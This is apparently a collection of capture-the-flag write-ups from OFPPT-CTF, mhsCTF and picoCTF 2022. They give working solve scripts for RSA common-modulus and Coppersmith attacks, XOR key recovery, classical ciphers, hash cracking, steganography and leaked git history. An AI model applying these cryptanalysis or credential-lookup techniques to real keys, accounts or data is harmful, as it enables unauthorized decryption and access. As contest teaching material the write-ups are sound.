e2 = '0x23'
ct2 = '0xd646418a1491d8b7c970e3ede9fb997076a0be6b04e42d0ce0d9eb6658c59306a6794154539309708bc86afca5b8258774f644cb5894e7bd04352baf8a7a19b37157cf6cc47659aa3d8dab1b8056067a3cbaba97b6e3316d10eadabe7d14c0ba41c5b55dc8e8bddc88340e47765d12b6537c65f20aca56afc2e586b9b77f7bb43f3ee07fd4549cc591fd22270a3dbe23a158b0048090a5ce62d425299ae17123dd56b8bbf6fce700c61718ae2e723335936fb57b1a6c560a70a637cf5551bd9b9bdef02c0ee7973cb8522441b61e0d46d773fcf4b24ea2f4549e71ff8b2185e215fa00ba6a9f60312e5eee6c7c2b624cf45b65de56c0e4fc00bff55e1529733'

n = (literal_eval(n))
e1 = (literal_eval(e1))
e2 = (literal_eval(e2))
ct = (literal_eval(ct1))
ct2 = literal_eval(ct2)
gdc, u,v = extended_gcd(e1,e2)
ct2_inv = (inverse(ct2, n))
m = (pow(ct, u, n) * pow(ct2_inv, -v, n)) % n
print(long_to_bytes(m))
```
```shell
❯ python solve.py
b'Welcome to OFPPT-CTF Event. Congratulations! You just decrypted an encrypted rsa message. Your flag is: OFPPT-CTF{R$4_M0d_4tt4cks_4re_4n0th3r_Cl4ss1c_Vuln3r4b1l17y}'
```



### File: WriteUps/OFPPT-CTF2022/Crypto/RSA Small/README.md

# RSA Small 
#####  Something is too small in that RSA encryption.
##### Can you decipher the flag?

We have the following output:
```
e = 5
n = 848679985797447869399955772819127213061137842373015804903762494359645720791040778076619433302674004347484565791581642609473387655735195295365279289016435642019259985990645911733119485800890708230053795033609181332000447274578889940499411197562111094428807949016438566888871179849827432797743465183571439731186111884712225698892368979349739206606593045379047207591044512475303068095583610049728424692564119172882065602439029603348602584135304945650000715210121217415159672068653299460404758884228046013042562965080049653891004083434176688089444298777532346069082024899343877834584938045202455200048186554846026727297621240451214798525048971378675972260019196481887830771437670138972634154814409503426355185620129053316128528423087492174694811793403655971666568345076618727967344075031994286240815344178567441153634038071947827327700917234091487142266390015552941979817722214984014258022713900663398969526301690250025575483527895147735655625252139228855555368584244676794350771701435632552963431752523714399310405951557242368697834717565197145134464156785931396734151509020243119926355165138086318689699700337185418254990682421255569532070095700384447469238825430018975257552596722400439696783949509883005145800952113577752688735953731
c = 1290693983568973212241774157251029501916031181300587856502104425060400825645233474412159795041070912725774295993070287999705559436744356587070331473154201672194895706660927805733716209570278752107616017153539788802992400477319421895132265308353914269512736230439032250634773967478099458568504291012797867556104874614937296951446237815056114697267646832399584346738180717835541698802244926455470361437886629916832531228754210088056426885624615069977138458285217304667225248399707130072871824121756788726012791836940206537928157363946715031682108412776344952206447795443691414126211540976228231813721934019177491660030885807301520689365508821556490894213716812362105926718336768325044896559692102465835491500325292511210492266786815154645636848969136539759596476855914079053513055397814403086420614976446006354782596760766518849838306525291408721775119110961750623361977018207968
```
And the following code:
```python
#! /usr/bin/env python3
from Crypto.PublicKey import RSA
from Crypto.Util.number import bytes_to_long, long_to_bytes


key = RSA.generate(4096, e = 5)
msg = b"Congrats! Your flag is: OFPPT-CTF{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}."
m = bytes_to_long(msg)
print("e = ".format(key.e))
print("n = ".format(key.n))
c = pow(m, key.e, key.n)
print("c = ".format(c))
```
At this point i didn't know how to break it because i'd never dealt with a challenge like this, luckily found this [git page](https://gsdt.github.io/blog/2018/07/20/stereotyped-message-attack/) that explains it in an easy and understandable way.

So we have the following equation.
```
(m+x)^e mod n = c
where x is the part we need to find.
```
The attack we need to implement is a **Coppersmith attack.**

We can implement this attack because: 
* We know a part of the plaintext.
```
Congrats! Your flag is: OFPPT-CTF{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}.
```
* **e** is small (e=5).
* x < N^(1/e).

We can solve it with the code provided by the page mentioned above.

(Note: You have to replace the **x's** of the plaintext with **\x00**)

```python
import time
import sys
import binascii
from Crypto.Util.number import bytes_to_long, long_to_bytes
# def long_to_bytes(data):
#     data = str(hex(long(data)))[2:-1]
#     return "".join([chr(int(data[i:i + 2], 16)) for i in range(0, len(data), 2)])
#     
# def bytes_to_long(data):
#     return int(binascii.hexlify(bytes(data, 'utf-8')), 16)

def main():
    e,N = (5, 848679985797447869399955772819127213061137842373015804903762494359645720791040778076619433302674004347484565791581642609473387655735195295365279289016435642019259985990645911733119485800890708230053795033609181332000447274578889940499411197562111094428807949016438566888871179849827432797743465183571439731186111884712225698892368979349739206606593045379047207591044512475303068095583610049728424692564119172882065602439029603348602584135304945650000715210121217415159672068653299460404758884228046013042562965080049653891004083434176688089444298777532346069082024899343877834584938045202455200048186554846026727297621240451214798525048971378675972260019196481887830771437670138972634154814409503426355185620129053316128528423087492174694811793403655971666568345076618727967344075031994286240815344178567441153634038071947827327700917234091487142266390015552941979817722214984014258022713900663398969526301690250025575483527895147735655625252139228855555368584244676794350771701435632552963431752523714399310405951557242368697834717565197145134464156785931396734151509020243119926355165138086318689699700337185418254990682421255569532070095700384447469238825430018975257552596722400439696783949509883005145800952113577752688735953731)

    c = 1290693983568973212241774157251029501916031181300587856502104425060400825645233474412159795041070912725774295993070287999705559436744356587070331473154201672194895706660927805733716209570278752107616017153539788802992400477319421895132265308353914269512736230439032250634773967478099458568504291012797867556104874614937296951446237815056114697267646832399584346738180717835541698802244926455470361437886629916832531228754210088056426885624615069977138458285217304667225248399707130072871824121756788726012791836940206537928157363946715031682108412776344952206447795443691414126211540976228231813721934019177491660030885807301520689365508821556490894213716812362105926718336768325044896559692102465835491500325292511210492266786815154645636848969136539759596476855914079053513055397814403086420614976446006354782596760766518849838306525291408721775119110961750623361977018207968
    m = bytes_to_long(b'Congrats! Your flag is: OFPPT-CTF{\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00}.')
    P.<x> = PolynomialRing(Zmod(N), implementation='NTL')
    pol = (m + x)^e - c
    roots = pol.small_roots(epsilon=1/50)
    print("Potential solutions:")
    for root in roots:
      #print("a")
      a = root+m
      print(root+m)
      #print(long_to_bytes(a))
      #print(long_to_bytes(root))
	
main()
```
After running it this was the output.
```shell
❯ sage solve.sage
Potential solutions:
16678794475845394497046381611277332634514263199780369350752104914618457519327167866737907944182739806871082540078368532323763163281817777410175160943379020961054807436578487598
```
I converted it to bytes and got the flag.
```python
>>> from Crypto.Util.number import long_to_bytes
>>> long_to_bytes(16678794475845394497046381611277332634514263199780369350752104914618457519327167866737907944182739806871082540078368532323763163281817777410175160943379020961054807436578487598)
b'Congrats! Your flag is: OFPPT-CTF{Sm4ll_3xp0n3nts_1n_RS4_4re_n0t_s3cur3}.'
```



### File: WriteUps/OFPPT-CTF2022/Crypto/Rome famous general/README.md

# Rome famous general 200
#####  We received an anonymous encrypted message. Can you help us decrypt this text? LRMMS-PSR{d3x3h_p43q4o_p1my3o}
#####;: it says you have to use a key: cipherkey

It's a keyed caesar cipher you can solve it [here](https://www.boxentriq.com/code-breaking/keyed-caesar-cipher).

**OFPPT-CTF{k3y3d_c43s4r_c1ph3r}**



### File: WriteUps/OFPPT-CTF2022/Crypto/Transposition/README.md

# Transposition
##### This one includes a transposition:
##### OFi3FntcP31_P1$sT_o4-_nCCl_4TscsF11c{_pTRrh44n3s10rpl0}s_

This is a rail fence cipher, i decoded it [here](https://www.dcode.fr/rail-fence-cipher).

**OFPPT-CTF{R41l_F3nc3_1s_4_Cl4ss1c_Tr4ns0p0sit1$on_c1ph3r}**




### File: WriteUps/OFPPT-CTF2022/Crypto/Weird sounds/README.md

# Weird sounds 
##### This weird sound is coming from my grandma's old TV, and I think it is a secret message. Can you help me decode this?

We are given and audio that sounds like sstv, so i tried decoding using this [tool](https://github.com/colaclanth/sstv).
```shell
❯ sstv -d weird.wav -o flag.png
[sstv] Searching for calibration header... Found!
[sstv] Detected SSTV mode Martin 1
[sstv] Decoding image...                 [####################################################################################################] 100%
[sstv] Drawing image data...
[sstv] ...Done!
```
We get the following image.

<img src="img/flag.png">




### File: WriteUps/OFPPT-CTF2022/Crypto/XOR/README.md

# XOR 
#####  Some workers convinced me to invest in their cryptosystem. They said their brand new XOR keystream cipher would revolutionize the crypto world.
##### Luckily they dropped a piece of paper with the source code on it and an encrypted flag. Can you prove they are wrong?!

We have the following ciphertext:
```
48ac3fe745bed053ac14ef2163cc70db58dfe862fe33860330dc22ea589c9f03d922e13365db038626eaee
```
And the following code:
```python
import os

FLAG = b'OFPPT-CTF{...REDACTED...}'


class HoneyComb:
    def __init__(self, key):
        self.vals = [i for i in key]

    def turn(self):
        self.vals = [self.vals[-1]] + self.vals[:-1]

    def encrypt(self, msg):
        keystream = []
        while len(keystream) < len(msg):
            keystream += self.vals
            self.turn()
        return bytes([msg[i] ^ keystream[i] for i in range(len(msg))]).hex()

hc = HoneyComb(os.urandom(6))

print(hc.encrypt(FLAG))
```
The key is only 6 bytes long, to match the length of the plaintext it is reused moving the last position to the first in each iteration.

Since we know the start of the plaintext (OFPPT-) finding the key isn't hard. 
```python
def find_first_six(enc):
    flag_vals = []
    for i in range (0, 12, 2):
        temp = int(enc[i:i+2],16)
        for j in range (255):
            if i == 0 and j ^ temp == 79:
                flag_vals.append(j)
                break
            if i == 2 and j ^ temp == 70:
                flag_vals.append(j)
                break
            if i == 4 and j ^ temp == 80:
                flag_vals.append(j)
                break
            if i == 6 and j ^ temp == 80:
                flag_vals.append(j)
                break
            if i == 8 and j ^ temp == 84:
                flag_vals.append(j)
                break
            if i == 10 and j ^ temp == 45:
                flag_vals.append(j)
                break
    return (flag_vals)
```
Know we do the same process as the encryption to decrypt the cipher.
```python
def decrypt(enc, vals):
    keystream = []
    while len(keystream) < len(enc):
        keystream += vals
        vals = turn(vals)
    return "".join(chr(enc[i] ^ keystream[i]) for i in range(len(enc)))
```

Full code:
```python
def find_first_six(enc):
    flag_vals = []
    for i in range (0, 12, 2):
        temp = int(enc[i:i+2],16)
        for j in range (255):
            if i == 0 and j ^ temp == 79:
                flag_vals.append(j)
                break
            if i == 2 and j ^ temp == 70:
                flag_vals.append(j)
                break
            if i == 4 and j ^ temp == 80:
                flag_vals.append(j)
                break
            if i == 6 and j ^ temp == 80:
                flag_vals.append(j)
                break
            if i == 8 and j ^ temp == 84:
                flag_vals.append(j)
                break
            if i == 10 and j ^ temp == 45:
                flag_vals.append(j)
                break
    return (flag_vals)
 
def to_decimal(enc):
    dec = []
    for i in range(0,len(enc),2):
        temp = int(enc[i:i+2],16)
        dec.append(temp)
    return dec

def turn(vals):
    vals = [vals[-1]] + vals[:-1]
    return vals

def decrypt(enc, vals):
    keystream = []
    while len(keystream) < len(enc):
        keystream += vals
        vals = turn(vals)
    return "".join(chr(enc[i] ^ keystream[i]) for i in range(len(enc)))


enc = "48ac3fe745bed053ac14ef2163cc70db58dfe862fe33860330dc22ea589c9f03d922e13365db038626eaee"
vals = find_first_six(enc)
dec = to_decimal(enc)
print(decrypt(dec, vals))
```
```shell
❯ python solve.py
OFPPT-CTF{X0r_w17h_sm4ll_k3y_vuln3r4b1l17y}
```



### File: WriteUps/mhsCTF-2022/Crypto/Crash Hacker (Em Dee 2)/README.md

<img src="img/challenge.png">

We need to crack the hash and [crackstation](https://crackstation.net) is a good option to do the job.

<img src="img/solution.png">

**The flag is: flag{zero_cool}**



### File: WriteUps/mhsCTF-2022/Crypto/Em dee/README.md

<img src="img/challenge.png">

This challenge is fairly easy, we need to encode the word <strong> mhsctf</strong>.

The first thing we need to do is to know which kind of hash is that of the examples. If we enter the one of the hashes in hashkiller we find out that is **md5**

<img src="img/md5.png">

The next step is to encode the plaintext

```python
>>> import hashlib
>>> hashlib.md5(b'mhsctf').hexdigest()
'fc3e3c405a66f8fe7cb7f17a838ea88c'
```
**the flag is: flag{fc3e3c405a66f8fe7cb7f17a838ea88c}**



### File: WriteUps/mhsCTF-2022/Crypto/Ipv11/README.md

<img src="img/challenge.png">

I got the letters for the ascii values.

```python
>>> numbers = [1, 9, 100, 51, 110, 116, 105, 102, 105, 51, 100]
>>> "".join(chr(x) for x in numbers)
'\x01\td3ntifi3d'
```
The 1 and 9 are symbols that aren't useful (the 1 being a start of header and 9 tab), but as we can see we are left with d3ntifi3d and the 1 before the tab completes the word.

**The flag is: flag{1d3ntifi3d}**




### File: WriteUps/mhsCTF-2022/Crypto/Peanuts/README.md

<img src="img/challenge.png">

This is the cipher.

<img src="img/3fa7aeee79c660ea86111702f0d4953f.png">

We have a hint of the cipher in the description of the challenge (**pig-pen**), i searched for a decoder online and [found one](https://planetcalc.com/7842/), i introduced the flag and got the following result.


<img src="img/descifrado.png">

I just needed to convert it to lowercase.

```python
>>> "GOODGRIEFCHARLIEBROWN".lower()
'goodgriefcharliebrown'
```

**The flag is: flag{goodgriefcharliebrown}**



### File: WriteUps/mhsCTF-2022/Crypto/What's Cooking 2/README.md

<img src="img/challenge.png">

We are given this base32 text:

```base32
GRYUG3ZUOFBWWNDRINVTI4KDNM2HCQ3LGRYUGQJUOFBW6NDRINXTI4KDN42HCQ3PGRYUG2ZUOFBUCNDRINVTI4KDN42HCQ3PGRYUG3ZUOFBW6Q3VJNTXCT2LM5YE6S3HOBHUWZ3QJ5FWO4CPJNTWOT2LM5YU6S3HOFHUWZ3RJ5FWO4KPJNTXCT2LM5TU6S3HOFHUWZ3RJ5FWO4KPJNTXCT2LM5YEC4TJN5FWU2LPJNKGS32LKRUW6S2UNFXUWVDJN5EUI2LPJNVGS32LNJUW6S3KNFXUW2TJN5FVI2LPJFCGS32LNJUW6S2UNFXUWVDJN5FVI2LPJNIUWNDRINXTI4KDNM2HCQ3LGRYUG2ZUOFBWWNDRINATI4KDN42HCQ3PGRYUG3ZUOFBW6NDRINVTI4KDIE2HCQ3LGRYUG2ZUOFBW6NDRINXTI4KDN5BXKS3HOFHUWZ3QJ5FWO4CPJNTXAT2LM5YE6S3HM5HUWZ3QJ5FWO4CPJNTXCT2LM5YU6S3HOFHUWZ3HJ5FWO4KPJNTXCT2LM5YU6S3HOBHUWZ3QIFZGS32LNJUW6S2UNFXUWVDJN5FVI2LPJNKGS32JIRUW6S3KNFXUW2TJN5FWU2LPJNVGS32LNJUW6SKENFXUW2TJN5FWU2LPJNVGS32LNJUW6S3HJM2HCQ3LGRYUG3ZUOFBW6NDRINXTI4KDN42HCQ2BGRYUG3ZUOFBW6NDRINXTI4KDNM2HCQ3LIN2UWZ3RJ5FWO4KPJNTXCT2LM5YU6S3HOBHUWZ3HJ5FWO4KPJNTXCT2LM5YU6S3HOFHUWZ3QIFZGS32LNJUW6S2UNFXUWVDJN5FVI2LPJNKGS32JIRUW6S2UNFXUW2TJN5FWU2LPJNVGS32LNJUW6SKENFXUW2TJN5FWU2LPJNVGS32LKRUW6S2RJM2HCQ3PGRYUG2ZUOFBWWNDRINVTI4KDNM2HCQ2BGRYUG2ZUOFBWWNDRINXTI4KDN42HCQ3PGRYUGQJUOFBW6NDRINVTI4KDNM2HCQ3LGRYUG22DOVFWO4KPJNTXAT2LM5YE6S3HOBHUWZ3QJ5FWOZ2PJNTXAT2LM5YE6S3HOFHUWZ3RJ5FWO4KPJNTWOT2LM5YU6S3HOFHUWZ3RJ5FWO4KPJNTXCQJ5HU======
```
When we decode it we get a base64
```base64
4qCo4qCk4qCk4qCk4qCk4qCA4qCo4qCo4qCo4qCo4qCk4qCA4qCk4qCo4qCo4qCo4qCoCuKgqOKgpOKgpOKgpOKgpOKggOKgqOKgqOKgqOKgqOKgqOKggOKgqOKgqOKgqOKgqOKgpArioKjioKTioKTioKTioKTioIDioKjioKjioKjioKjioKTioIDioKjioKTioKTioKTioKQK4qCo4qCk4qCk4qCk4qCk4qCA4qCo4qCo4qCo4qCo4qCk4qCA4qCk4qCk4qCo4qCo4qCoCuKgqOKgpOKgpOKgpOKgpOKggOKgpOKgpOKgqOKgqOKgqOKggOKgqOKgqOKgqOKgpOKgpArioKjioKTioKTioKTioKTioIDioKjioKjioKjioKjioKjioIDioKjioKjioKjioKjioKgK4qCk4qCo4qCo4qCo4qCo4qCA4qCo4qCo4qCo4qCk4qCkCuKgqOKgqOKgqOKgqOKgpOKggOKgqOKgqOKgqOKgqOKgpArioKjioKTioKTioKTioKTioIDioKTioKjioKjioKjioKjioIDioKjioKjioKjioKTioKQK4qCo4qCk4qCk4qCk4qCk4qCA4qCk4qCk4qCo4qCo4qCo4qCA4qCo4qCk4qCk4qCk4qCkCuKgqOKgpOKgpOKgpOKgpOKggOKgpOKgpOKgqOKgqOKgqOKggOKgqOKgqOKgqOKgqOKgqA==
```
To decode it one command we can use:
```shell
❯ base32 -d 7732348dab3df4cf51cc5f6443aa6e38.txt | base64 -d
⠨⠤⠤⠤⠤⠀⠨⠨⠨⠨⠤⠀⠤⠨⠨⠨⠨
⠨⠤⠤⠤⠤⠀⠨⠨⠨⠨⠨⠀⠨⠨⠨⠨⠤
⠨⠤⠤⠤⠤⠀⠨⠨⠨⠨⠤⠀⠨⠤⠤⠤⠤
⠨⠤⠤⠤⠤⠀⠨⠨⠨⠨⠤⠀⠤⠤⠨⠨⠨
⠨⠤⠤⠤⠤⠀⠤⠤⠨⠨⠨⠀⠨⠨⠨⠤⠤
⠨⠤⠤⠤⠤⠀⠨⠨⠨⠨⠨⠀⠨⠨⠨⠨⠨
⠤⠨⠨⠨⠨⠀⠨⠨⠨⠤⠤
⠨⠨⠨⠨⠤⠀⠨⠨⠨⠨⠤
⠨⠤⠤⠤⠤⠀⠤⠨⠨⠨⠨⠀⠨⠨⠨⠤⠤
⠨⠤⠤⠤⠤⠀⠤⠤⠨⠨⠨⠀⠨⠤⠤⠤⠤
⠨⠤⠤⠤⠤⠀⠤⠤⠨⠨⠨⠀⠨⠨⠨⠨⠨
```
The next thing we get is braille, so i put it in cyberchef and it had another two layers which where morse and octal.

<img src="img/flag.png">





### File: WriteUps/mhsCTF-2022/Crypto/What's Cooking/README.md

<img src="img/challenge.png">

I decoded the text in this [page](https://onlinestringtools.com/convert-ascii-to-string), it was octal ascii, this gives us a hexadecimal string.

<img src="img/1.png">

After decoding the hexadecimal we have a base64.

<img src="img/2.png">

Decode the base64.

```shell
echo "ZmxhZ3ttbW1fcEAkdGF9" | base64 -d
flag{mmm_p@$ta}
```



### File: WriteUps/mhsCTF-2022/Forensics/Blank Slate 2/README.md

<img src="img/challenge.png">

We are given a zip that contains a git repo. This git repo only has a md file

```shell
957d69fa3cc9895ac8fa70cb5e75b698 on  master
❯ cat README.md
## Welcome to my first repo!

I hope I don't accidentally put some secret information here! ;)


- Update: I did accidentally put some secret information here, but it's ok; I've taken care of it.
```

With this message we can guess that the secret info can be found in the past commits, so we check the log

```shell
957d69fa3cc9895ac8fa70cb5e75b698 on  master
❯ git log -p -2
commit c8673254c14f20cff2d166ed1e05b9ad11ab41e1 (HEAD -> master)
Author: Manav Malik <manavmalik36@gmail.com>
Date:   Thu Mar 18 22:15:20 2021 -0400

    added update to readme

diff --git a/README.md b/README.md
index d48fed1..322b544 100644
--- a/README.md
+++ b/README.md
@@ -1,3 +1,6 @@
 ## Welcome to my first repo!

 I hope I don't accidentally put some secret information here! ;)
+
+
+- Update: I did accidentally put some secret information here, but it's ok; I've taken care of it.

commit 3cbea1892950d2a2d33ef34438ab2a9284550e20
Author: Manav Malik <manavmalik36@gmail.com>
Date:   Thu Mar 18 22:14:25 2021 -0400

    removed sensitive information

diff --git a/flag b/flag
deleted file mode 100644
index f50fc31..0000000
--- a/flag
+++ /dev/null
@@ -1 +0,0 @@
-flag{w4tch_0ut_f0r_g17_h15t0ry}
```
**The flag is: flag{w4tch_0ut_f0r_g17_h15t0ry}**







### File: WriteUps/mhsCTF-2022/Forensics/Blank Slate 3/README.md

<img src="img/challenge.png">

This is the image we are given.

<img src="img/87dda8317f800936d245ed709350bd3d.png">

We can find the flag using **StegSolve.jar**


<img src="img/solve.png">

**The flag is: flag{1t$_n0t_3mpty}**



### File: WriteUps/mhsCTF-2022/Forensics/Blank Slate 4/README.md

<img src="img/challenge.png">

We are given a txt file that appears to be empty, one tool for empty space is stegsnow, however this won't return any output, so there must be another solution and there is, this challenge is similar to one of the picogym that i already solved thanks to this [writeup](https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/WhitePages.md)


If we inspect the file in a hexeditor we will find 3 patterns.

<img src="img/hex.png">

The first one is "EFBBBFE2808B" the second "E2808B" and the third "20", in this case we have 3 options not 2, but we can still try to convert it to binary. 

```python
f = open("33dc1a20cb2bfd61ee87a3b4126d40ca.txt", "rb") 
f = bytearray(f.read())
#print(f)
f = f.replace(b'\xef\xbb\xbf\xe2\x80\x8b',b'0')
f = f.replace(b'\xe2\x80\x8b',b'0')
f = f.replace(b'\x20', b'1')
f = f.decode("ascii")
print (f)
flag = ""
for i in range(0, len(f), 8):
    flag += chr(int(f[i:i+8],2))
print(flag)
```
**the flag is: flag{sti11_n0t_b1ank}**




### File: WriteUps/mhsCTF-2022/Forensics/Blatant Corruption/README.md

<img src="img/challenge.png">

We have a corrupted image, checking the header using a hex editor reveals that we are missing the first four bytes of the png signature, but the rest of the info is there (more info on the png header [here](https://ctftime.org/writeup/31187)).

<img src="img/corrupt_header.png">

We add the missing bytes

<img src="img/header.png">

But even with that fix the image won't open, so i used the tool [PCRT](https://github.com/sherlly/PCRT) to help me fix the image

```shell
	 ____   ____ ____ _____
	|  _ \ / ___|  _ \_   _|
	| |_) | |   | |_) || |
	|  __/| |___|  _ < | |
	|_|    \____|_| \_\|_|

	PNG Check & Repair Tool

Project address: https://github.com/sherlly/PCRT
Author: sherlly
Version: 1.1
	
[Finished] Correct PNG header
[Detected] Error IHDR CRC found! (offset: 0x1D)
chunk crc:
correct crc: 5F7719B4
[Notice] Try fixing it? (y or n) [default:y] y
[Finished] Successfully fix crc
[Finished] IHDR chunk check complete (offset: 0x8)
[Detected] Error IDAT chunk data length! (offset: 0x1D)
chunk length:5F7719B4
actual length:3B72
[Notice] Try fixing it? (y or n) [default:y] y
[Warning] Only fix because of DOS->Unix conversion
[Failed] Fixing failed, auto discard this operation...
[Detected] Error IDAT chunk data length! (offset: 0x3B9B)
chunk length:5F7719B4
actual length:3B66
[Notice] Try fixing it? (y or n) [default:y] y
[Warning] Only fix because of DOS->Unix conversion
[Failed] Fixing failed, auto discard this operation...
[Finished] IDAT chunk check complete (offset: 0x1D)
[Finished] Correct IEND chunk
[Finished] IEND chunk check complete
[Finished] PNG check complete
[Notice] Show the repaired image? (y or n) [default:n] y
```

<img src="img/flag.png">

**The flag is: flag{str@ight_n_narr0w}**



### File: WriteUps/mhsCTF-2022/Forensics/Chimera/README.md

<img src="img/challenge.png">

This is the image we are given

<img src="img/img.png">

Based on the description we can assume that he image contains data inside, so i used **foremost** to extract it.

```shell
❯ foremost 87122c397ac8b10d53057a2c9ec1834e.png
Processing: 87122c397ac8b10d53057a2c9ec1834e.png
|*|

mhsctf/Forensics/Chimera
❯ ls
87122c397ac8b10d53057a2c9ec1834e.png  challenge.png  output

mhsctf/Forensics/Chimera
❯ cd output/

Forensics/Chimera/output
❯ ls
audit.txt  png

Forensics/Chimera/output
❯ cd png

Chimera/output/png
❯ ls
00000458.png

Chimera/output/png
❯ feh 00000458.png
```

This the image inside.

<img src="img/flag.png">

**The flag is: flag{4bs0rb3d}**



### File: WriteUps/mhsCTF-2022/Forensics/In Plain Sight/README.md

<img src="img/challenge.png">

This is the image we are given
<img src="img/c420629a20ab083202fddd39f722b41f.png">

Since it is a png image we can inspect it with some tools, in this case the one that gave the flag was **zsteg**

<img src="img/solution.png">

**The flag is: flag{H1dd3nM1ck3y}**



### File: WriteUps/mhsCTF-2022/General/Reconstruction/README.md

<img src="img/challenge.png">

We are given a file with a bunch of numbers between 0 to 255, these are the rgb values of the image, also every 960 rgb values we have a semicolon, we can take this as a separator of rows.

We made a script to reconstruct the image based on the rgb values.

(We found out that there are 960 values in each row, so the size of the image was 960 x 960).

```python
from PIL import Image
import numpy 
import matplotlib.pyplot as plt
f = open("./9712a0c4e51eae4c229538d050ae0d38.txt", "r")
lines = f.read().strip(";")
lines = (lines.split(";"))
pixels = []
for x in lines:
    lines2 = x.strip(",").split(",") 
    pixels.append(lines2)
    
#print(len(pixels))
imagen = []
for x in pixels:
    for i in range(0,len(x),3):
        tupla = (int(x[i]),int(x[i+1]),int(x[i+2]))
        imagen.append(tupla)

im2 = Image.new(mode = 'RGB', size = (960,960))
im2.putdata(imagen)
im2.save('myimg.png')
```

This produced the following image

<img src="img/myimg.png">

So we fixed it in gimp.

<img src="img/myimg_fix.png">

**The flag is: flag{411_7h3_king5_h0rs3s_and_a11_th3_kings_m3n}**



### File: WriteUps/mhsCTF-2022/Web/James Harold Japp/README.md

<img src="img/challenge.png">

We enter to a page with just a login

<img src="img/page.png">

If we inspect the source code we will find a function with the password

<img src="img/source1.png">

When we enter this password we are redirected to the following page

<img src="img/page2.png">

If we inspect the source code we will find the flag in a comment

<img src="img/flag.png">

**The flag is: flag{1n$p3ct0r_g3n3r@l}**



### File: WriteUps/picoCTF2022/Crypto/basic-mod1/README.md

<img src="img/challenge.png">

The challenge description is pretty self explanatory, here's the python script

```python
import string
alfabeto = string.ascii_lowercase
alfabeto += "0123456789_"

flag_enc = [202,137,390,235,114,369,198,110,350,396,390,383,225,258,38,291,75,324,401,142,288,397]
flag = ""
for c in flag_enc:
    pos = c % 37
    flag += alfabeto[pos]

print(flag)
```
**flag: picoCTF{r0und_n_r0und_b6b25531}**



### File: WriteUps/picoCTF2022/Crypto/basic-mod2/README.md

<img src="img/challenge.png">

We are given the following message:
```
104 85 69 354 344 50 149 65 187 420 77 127 385 318 133 72 206 236 206 83 342 206 370
```
We apply what the description says.

```python
import string

alphabet = string.ascii_lowercase
alphabet += "0123456789_"
flag_enc = [104, 85, 69, 354, 344, 50, 149, 65, 187, 420, 77, 127, 385, 318, 133, 72, 206, 236, 206, 83, 342, 206, 370]

flag = ""
for c in flag_enc: 
    pos = pow(c, -1, 41)
    flag += alphabet[pos-1]

print(flag)
```



### File: WriteUps/picoCTF2022/Crypto/credstuff/README.md

<img src="img/challenge.png">

We are given a .tar that contains two .txt files, one containing users and the other the passwords.

Using grep i found the line where the user is.
```shell
❯ grep -ni cultiris usernames.txt
378:cultiris
```
Then i printed the password in that line using awk.
```shell
❯ awk '{if(NR==378) print $0}' passwords.txt
cvpbPGS{P7e1S_54I35_71Z3}
```
It looks like rot13, so i deciphered it.
```shell
❯ awk '{if(NR==378) print $0}' passwords.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
picoCTF{C7r1F_54V35_71M3}
```



### File: WriteUps/picoCTF2022/Crypto/diffie-hellman/README.md

<img src="img/challenge.png">

**(This challenge isn't available in picoGYM).**

### Intended Solution:

To generate the secret keys from both Alice and Bob in diffie-hellman we have to perform the following operations:
```
A = g^a mod p
B = g^b mod p
Key1 = B^a mod p
Key2 = A^b mod p
```
Having the key we use it to perform a shift in the cipher text.

I created a script to solve the challenge

```python
import string
flag_enc = "H98A9W_H6UM8W_6A_9_D6C_5ZCI9C8I_AJ8H7JJ7"
alphabet = string.ascii_uppercase + "0123456789"

p = 13
g = 5
a = 7
b = 3

def diffie_hellman_private_key(p,g,a,b):
    A = pow(g,a,p)
    B = pow(g,b,p)
    
    S1 = pow(B,a,p)
    S2 = pow(A,b,p)
    return S1, S2

def caesar_shift(shift, cipher):
    plain_text = ""
    for c in cipher:
        if c == '_' or c == ' ':
            plain_text += c
        else:
            pos = alphabet.index(c)
            pos = (pos + shift) % 36
            plain_text += alphabet[pos]
    return plain_text
    
S = diffie_hellman_private_key(p,g,a,b)
print(caesar_shift(-S[0],flag_enc))
```
```shell
❯ python solve.py
C4354R_C1PH3R_15_4_817_0U7D473D_5E3C2EE2
```
**The flag is: picoCTF{C4354R_C1PH3R_15_4_817_0U7D473D_5E3C2EE2}**

### Unintended Solution:
Since the cipher text is encoded in a caesar cipher we could just bruteforce it to get the flag, being the shift of only 5.



### File: WriteUps/picoCTF2022/Crypto/morse-code/README.md

<img src="img/challenge.png">

We are given a wav file that contains a morse code message, we can decipher it using this [page](https://morsecode.world/international/decoder/audio-decoder-adaptive.html).

After decoding it i transformed the result to lowercase.

**flag is: picoCTF{wh47_h47h_90d_w20u9h7}**




### File: WriteUps/picoCTF2022/Crypto/substitution0/README.md

<img src="img/challenge.png">

First i tried using a frecuency analysis script but i couldn't find a solution, so i used [quipqiup](https://quipqiup.com/) this gave me the flag.

**the flag is: picoCTF{5UB5717U710N_3V0LU710N_03055505}**




### File: WriteUps/picoCTF2022/Crypto/substitution1/README.md

<img src="img/challenge.png">

I used [quipqiup](https://quipqiup.com/) to solve the challenge.

**the flag is: picoCTF{FR3QU3NCY_4774CK5_4R3_C001_7AA384BC}**



### File: WriteUps/picoCTF2022/Crypto/substitution2/README.md

<img src="img/challenge.png">

I used [quipqiup](https://quipqiup.com/) to solve the challenge,and added the numbers because the page didn't show them in the plain text.

**The flag is: picoCTF{N6R4M_4N41Y515_15_73D10U5_702F03FC}**



### File: WriteUps/picoCTF2022/Crypto/sum-o-primes/README.md

<img src="img/challenge.png">
We are given two files, the generator (that's not important) and the output which contains the sum of p and q, the product of p and q and the cipher text.

```
x = 193a4f9d511dfa628e25a42de2e16123a4503c2ba1983dab3402b0f84d2b145116c3d45c4ece5c2ef62e425df830c9cf9b324edd729fdf75f8cb89cfad0d217cc83890c37e1caa39c41588deb59b0aae82291ee407dcb51c80be787ad7f61802c6811830faf12be64a8764e95471c645c5dddc686d7068126f5777c731b125198
